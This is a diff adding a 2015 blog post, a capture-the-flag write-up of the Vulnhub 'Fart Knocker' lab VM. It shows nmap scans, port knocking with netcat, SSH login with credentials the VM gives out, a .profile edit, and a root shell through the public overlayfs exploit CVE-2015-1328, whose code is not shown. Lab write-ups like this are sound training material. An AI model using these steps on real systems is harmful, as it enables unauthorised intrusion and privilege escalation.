@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>Vulnhub - Fart Knocker | maggick's logs</title>
+
+    <meta name="author" content="Matthieu Keller">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="http://matthieukeller.com/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="http://yui.yahooapis.com/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="http://matthieukeller.com/theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="http://matthieukeller.com/index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+                <li>
+                  <a href="http://matthieukeller.com/category/misc.html">Misc</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/programming.html">programming</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/programming-security.html">programming, security</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/security.html">security</a>
+                </li>
+                <li>
+                  <a href="http://matthieukeller.com/category/sports.html">Sports</a>
+                </li>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="http://matthieukeller.com/pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="http://matthieukeller.com/pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="http://matthieukeller.com/2015/06/vulnhub-fart-knocker.html" title="Read more" class="entry-title-link">
+                Vulnhub - Fart Knocker</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2015-06-16T23:30:00+02:00">16 Jun 2015</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="http://matthieukeller.com/author/matthieu-keller.html" title="Read more posts from Matthieu Keller" class="meta-link">Matthieu Keller</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="http://matthieukeller.com/tag/challenge.html" title="Read more with the label challenge" class="meta-link">challenge</a> 
+          <a href="http://matthieukeller.com/tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+      </span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left"
+src="/media/2015.06/beavis_butthead.jpg" alt="beavis and butthead" width="262"></p>
+<p>I continued to play with the vulnhub virtual machine an started the
+<a href="https://www.vulnhub.com/entry/tophatsec-fartknocker,115/">TopHatSec - Fart Knocker</a>.
+This VM is an Ubuntu 14.04 32 bits.</p>
+<p>The goal of this challenge is to break into the machine and root it.</p>
+<blockquote>
+<p>If you beat the box then please shoot me an email! Have fun guys!
+P.S. I got the word "Fart Knocker" from watching beavis and butthead back in the
+day. Otherwise you kids might not understand :)</p>
+</blockquote>
+
+
+<h1 id="discovery">Discovery</h1>
+<p>First of all we determine the VM IP address a with a simple <code>nmap -sP</code>.</p>
+<h2 id="nmap">Nmap</h2>
+<p>As always we start by <a href="http://nmap.org/">nmaping</a> the server in order to see the open ports:</p>
+<div class="highlight"><pre><span></span>[maggick@arch FartKnocker]$ nmap -A 10.0.2.6
+# Nmap 6.47 scan initiated Thu Apr 23 16:21:05 2015 as: nmap -oA nmap -A 10.0.2.6
+Nmap scan report for 10.0.2.6
+Host is up (0.0034s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn&#39;t have a title (text/html).
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+# Nmap done at Thu Apr 23 16:21:12 2015 -- 1 IP address (1 host up) scanned in 6.98 seconds
+</pre></div>
+
+
+<p>Only the port 80 is open with an HTTP server.</p>
+<p>As always I had launch a <a href="https://cirt.net/nikto2">nikto</a> against the server
+but no interesting result.</p>
+<h1 id="exploitation">Exploitation</h1>
+<p>We go to the web page and only found a pcap file which is a capture of some
+network traffic.</p>
+<h2 id="pcap1">pcap1</h2>
+<p>We analyse the <code>pcap1.pcap</code> file. The packets and the VM name leads us to ports
+knocking. As I do not know anything about it I have done some research on internet to
+understand the principle (which is quite simple: send packets to a ports sequence
+will open an other port) and fund a
+<a href="https://eindbazen.net/2011/12/phd-ctf-quals-2011-%E2%80%93-port-knocking/">basic script to knock</a>.
+I adapt it to my need and launch it against the target. The script will knock on
+the sequence ports extract from the pcap file (it is quite simple to read with
+<a href="https://www.wireshark.org/">wireshark</a>):</p>
+<div class="highlight"><pre><span></span>[maggick@arch FartKnocker]$ sudo python2 script.py
+WARNING: No route found for IPv6 destination :: (no default route?)
+[*] Knocking on 10.0.2.6:7000
+[*] Knocking on 10.0.2.6:8000
+[*] Knocking on 10.0.2.6:9000
+[*] Knocking on 10.0.2.6:7000
+[*] Knocking on 10.0.2.6:8000
+[*] Knocking on 10.0.2.6:9000
+[*] Knocking on 10.0.2.6:8888
+[*] Scanning for open ports using nmap
+</pre></div>
+
+
+<p>A <a href="http://nmap.org/">nmap</a> scan is launched after the knocking sequence to see
+what port will open:</p>
+<div class="highlight"><pre><span></span>Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-27 16:35 CEST
+Nmap scan report for 10.0.2.6
+Host is up (0.00060s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE         VERSION
+80/tcp   open  http            Apache httpd 2.4.7 ((Ubuntu))
+8888/tcp open  sun-answerbook?
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds
+</pre></div>
+
+
+<p>This port run an other HTTP service which give us a second url <code>/burgerworld</code>
+and a second pcap file.</p>
+<h2 id="pcap2">pcap2</h2>
+<p>After trying a bit to replay and understand the file I used the follow  TCP
+stream function from <a href="https://www.wireshark.org">wireshark</a>, and the following
+appears:</p>
+<p><img alt="eins drei drei sieben" src="/media/2015.06/beavis.jpg" /></p>
+<p><strong>eins drei drei sieben</strong> means one, three, three, seven (7 years of German at least
+useful, well it was of some use during the NDH qualifications too).</p>
+<p>Once again we knock on port 1, 3, 3 and 7, the port 1337 open and show us an
+other URL: <code>/iamcornholio/</code>. We got some code looking like base64.</p>
+<h2 id="base64">base64</h2>
+<p>The code is:  T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK which is (after
+base64 decode) "Open up SSH: 8888 9999 7777 6666". Once more, port knocking on
+port 8888, 9999, 7777 and 6666. This time I simply use netcat to knock:</p>
+<div class="highlight"><pre><span></span>nc 10.0.2.6 8888
+nc 10.0.2.6 9999
+nc 10.0.2.6 7777
+nc 10.0.2.6 6666
+</pre></div>
+
+
+<p>Once more we launch nmap to see if a port was opened:</p>
+<div class="highlight"><pre><span></span>[maggick@arch FartKnocker]$ nmap  -A 10.0.2.6
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-28 13:32 CEST
+Nmap scan report for 10.0.2.6
+Host is up (0.0013s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     (protocol 2.0)
+| ssh-hostkey:
+|   1024 8d:1f:97:c6:4d:e9:1d:2b:5d:b8:6e:64:66:bb:48:2b (DSA)
+|   2048 02:31:1c:77:aa:c1:f6:2b:d3:09:f6:e0:63:fe:a9:37 (RSA)
+|_  256 fe:16:33:a4:4d:7f:3d:db:b6:11:d4:b8:c1:32:b6:79 (ECDSA)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn&#39;t have a title (text/html).
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds
+</pre></div>
+
+
+<p>Well, the ssh port 22 is now open.</p>
+<h2 id="ssh">SSH</h2>
+<p>We try to connect to it:</p>
+<div class="highlight"><pre><span></span>[maggick@arch FartKnocker]$ ssh 10.0.2.6
+The authenticity of host &#39;10.0.2.6 (10.0.2.6)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:uSdkKIWXcJl0j0P5Y+cAzjD9CJOFQ/NxtG8kz8ptzFE.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added &#39;10.0.2.6&#39; (ECDSA) to the list of known hosts.
+############################################
+# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
+# USERNAME: butthead                       #
+# PASSWORD: nachosrule                     #
+############################################
+</pre></div>
+
+
+<p>The password and username are given by the ssh message, we should use them
+directly:</p>
+<div class="highlight"><pre><span></span>[maggick@arch FartKnocker]$ ssh 10.0.2.6 -lbutthead
+############################################
+# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
+# USERNAME: butthead                       #
+# PASSWORD: nachosrule                     #
+############################################
+butthead@10.0.2.6&#39;s password:
+Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-46-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+Last login: Tue Mar  3 01:02:49 2015 from 192.168.56.102
+You are only logging in for a split second! What do you do!
+</pre></div>
+
+
+<p>We got an ssh connection but we are logout immediately.</p>
+<p><em>I will no more put the CONGRATS message for your own sanity.</em></p>
+<p>We execute a command directly within the ssh command (a classic ssh feature):</p>
+<div class="highlight"><pre><span></span>[maggick@arch FartKnocker]$ ssh 10.0.2.6 -lbutthead ls
+nachos
+</pre></div>
+
+
+<p>The commands is executed, my first reaction was to read <code>/etc/passwd/</code> as the
+flag was there in
+<a href="http://matthieukeller.com/2015/04/vulnhub-freshly.html">the last TopHatSec challenge</a>
+but this is not so simple this time. Nevertheless we can get a shell buy using
+<code>/bin/bash/</code>. We read the <code>nachos</code> file in buttheads's home:</p>
+<div class="highlight"><pre><span></span>cat nachos
+Great job on getting this far.
+
+Can you login as beavis or root ?
+</pre></div>
+
+
+<p>The next step seems to get a beavis or root shell from the butthead one. This a
+privilege escalation.</p>
+<h2 id="guessing">Guessing</h2>
+<p><strong>Disclaimer:</strong> during my long guessing period for privilege escalation I looked at
+the other writeup to see if I missed something but they all used password
+bruteforce. I do not like bruteforce, so I continue looking for something else.</p>
+<p>This part was the hardest of this challenge. It take me three weeks (not at full
+time of course) to get over with it. I will give you some of my guessing steps:</p>
+<p>First of all to get a shell we just need to modify the <code>.profil</code> file:</p>
+<div class="highlight"><pre><span></span>sed &#39;s/exit//&#39; -i .profile
+</pre></div>
+
+
+<p>Let see what there is in beavis' home:</p>
+<div class="highlight"><pre><span></span>ls /home/beavis
+html
+nc1.sh
+ncone
+nctwo
+</pre></div>
+
+
+<p>There was a lot of netcat scripts but none of them allow us to make our privilege
+escalation.</p>
+<p>Looking for a solution to get login as beavis, we notice that there was more
+pcap files at our disposal :</p>
+<div class="highlight"><pre><span></span>ls /var/www/html -R
+/var/www/html:
+burgerworld
+iamcornholio
+index.html
+pcap1.pcap
+spanishfly
+
+/var/www/html/burgerworld:
+index.html
+pcap2.pcap
+
+/var/www/html/iamcornholio:
+index.html
+pcap3.pcap
+
+/var/www/html/spanishfly:
+pcap4.pcap
+</pre></div>
+
+
+<p>Even more troll: there is a folder <code>/var/backups/</code> containing backups from the
+<code>/etc/shadow</code> file (which could be useful to crack the password):</p>
+<div class="highlight"><pre><span></span>butthead@Huhuhhhhhuhuhhh:~$ ls -la /var/backups/
+total 4872
+drwxr-xr-x  2 root root      4096 Apr 28 06:25 .
+drwxr-xr-x 12 root root      4096 Mar  2 17:45 ..
+-rw-r--r--  1 root root      7380 Mar  2 23:39 apt.extended_states.0
+-rw-r--r--  1 root root   4516724 Mar  2 16:45 aptitude.pkgstates.0
+-rw-r--r--  1 root root    437586 Mar  2 23:39 dpkg.status.0
+-rw-------  1 root root       690 Mar  3 00:30 group.bak
+-rw-------  1 root shadow     577 Mar  3 00:30 gshadow.bak
+-rw-------  1 root root      1143 Mar  3 00:30 passwd.bak
+-rw-------  1 root shadow     939 Mar  3 00:30 shadow.bak
+</pre></div>
+
+
+<p>This backups are copied by the daily crontab. A solution may be to attempt to a
+race condition against it. I have not dig into the subject.</p>
+<p>I also used
+<a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">unix-privsec-check</a>
+in order to search for the privilege escalation.</p>
+<h2 id="cve-2015-1328">CVE-2015-1328</h2>
+<p>I had a bit stop to search for the privilege escalation when I saw that an
+exploit as been published for the
+<a href="http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html">CVE-2015-1328</a>,
+which use the incorrect permission check in overlayfs in Ubuntu to give root
+privileges: <a href="http://seclists.org/oss-sec/2015/q2/717">http://seclists.org/oss-sec/2015/q2/717</a></p>
+<p>Hopefully we are on a vulnerable Ubuntu. So I compiled <code>ofs.c</code> with <code>gcc</code> and
+launch it, well it works and give me immediately a root shell.</p>
+<div class="highlight"><pre><span></span>root@Huhuhhhhhuhuhhh:/home/butthead# cat /root/SECRETZ
+You have done a great job, if you can see this, please shoot me an email
+and let me know that you have beat this box!
+
+SECRET = &quot;LIVE LONG AND PROSPER, REST IN PEACE MR. SPOCK&quot;
+
+admin@top-hat-sec.com
+</pre></div>
+
+
+<h1 id="conclusion">Conclusion</h1>
+<p>This was a nice challenge as I learned a lot about the port knocking. The
+privilege escalation was quit interesting to search for and the CVE-2015-1328
+exploitation was a lot of fun.</p>
+<p>Thank you <a href="http://top-hat-sec.com">top-hat-sec</a> for this challenge and
+<a href="http://vulnhub.com">vulnhub</a> as always.</p>
+    </div>
+
+        <footer>
+<div class="social-buttons">
+
+
+</div>        </footer>
+
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = "matthieukeller";
+        var disqus_identifier = "2015/06/vulnhub-fart-knocker.html";
+
+        (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-books"></span>
+                    <a href="/pages/books.html">books</a>
+                </li>
+                <li>
+                    <span class= "icons icons-palmares"></span>
+                    <a href="/pages/palmares.html">palmares</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/matthieukeller">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-linkedin"></span>
+                    <a href="https://linkedin.com/in/matthieukeller">linkedin</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+    <script>
+        (function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
+        function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
+        e=o.createElement(i);r=o.getElementsByTagName(i)[0];
+        e.src='//www.google-analytics.com/analytics.js';
+        r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
+        ga('create','UA-63314567-1');ga('send','pageview');
+    </script>
+
+</div>
+</body>
+</html>
